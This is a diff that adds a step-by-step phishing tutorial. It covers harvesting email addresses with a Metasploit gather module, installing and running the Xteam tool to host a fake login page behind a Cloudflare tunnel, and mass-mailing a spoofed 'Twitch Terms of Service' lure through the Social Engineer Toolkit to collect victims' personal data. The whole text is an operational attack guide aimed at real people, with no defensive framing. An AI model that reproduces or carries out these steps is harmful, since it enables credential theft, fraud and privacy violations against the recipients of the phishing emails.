@@ -1,0 +1,63 @@
+#Phishing attacks - By Sn0w
+
+#Lets start with gathering emails for our attack, To do this we are going to harvest emails from yahoo.com
+
+open your terminal in root
+msfconsole
+search collector
+use gather/search_email_collector
+show options
+set DOMAIN <domain>
+set OUTFILE <filename.txt>
+show options
+exploit - hit enter and let it run
+
+#once done navigate to the <filename.txt> and you now have a list of emails to start your attack
+
+#Now that we have our email list lets get our Xteam installed with GitHub
+
+#open terminal in root
+
+$sudo apt install git
+$sudo git clone https://github.com/xploitstech/Xteam 
+ls
+cd Xteam
+pip3 install -r requirements.txt
+chmod +x *
+$sudo bash Xteam.sh 
+
+#Now that we have Xteam set up and ready to go lets start it by navigating to the Xteam directory, once there type the following 
+
+$sudo bash Xteam.sh to start Xteam
+option 3 - hit enter
+choose your attack website
+select portforwarding service, I recommend CloudFlare option 3 - hit enter
+now copy URL #2 into your phising email 
+be sure to LEAVE THIS TERMINAL OPEN while it collects your victims data!
+
+#Now that we have our "keylogger" started lets get those emails sent out! To do this ill be using the baked in Kali tool "SEC" or Social Enginerring Toolkit (root)
+
+open the program and enter your password
+1 - hit enter
+5 - hit enter
+from here you can choose to either target one specific email address or the nifty email list you gathered earlier in this tutorial, for this will use the MASS sender
+2 - hit enter 
+#now you need to set the path where the email list lives, you can drag and drop the list into the terminal or type the path
+/home/sn0w/yahoolist.txt 
+1 - enter 
+#enter the email account you will be sending the email from (your email)
+sn0whacking@gmail.com - hit enter
+#next itll ask what you want the RECIEVER to see for who the email is from - I suggest a bogus email you have pre-made for this
+sn0whackingemail@gmail.com - hit enter
+#enter the pre-made emails password and hit enter
+flag message as Priority? up to you I suggest no as this looks fishy (be sure to type yes OR no and hit enter)
+#next two options are up to you I usually select not to so hit n and enter
+hit n and enter 
+Email Subject: make it look official, for example: Twitch.tv Update to our Terms of Service 
+send as plain or html? I choose plain so p and hit enter 
+type the body: for example - "Our Terms and Service agreement has changed for the 2022 year, Please log in and view the updated Terms of Service agreement by clicking this link:" 
+#now lets grab that 2nd URL from the Xteam hacker tool and paste it at the end of that email so it looks like this: Our Terms and Service agreement has changed for the 2022 year, Please log in and view the updated Terms of Service agreement by click this link: http://unlimited-twitch-tv-user-for-free@pick-nam-drawn-textile.trycloudflare.com END
+be sure at the end of the message body type the word END in caps to end the message, once done hold CTRL + C and the emails will be sent
+leave the Xteam tool open and watch your victims personal info start rolling in! 
+
+
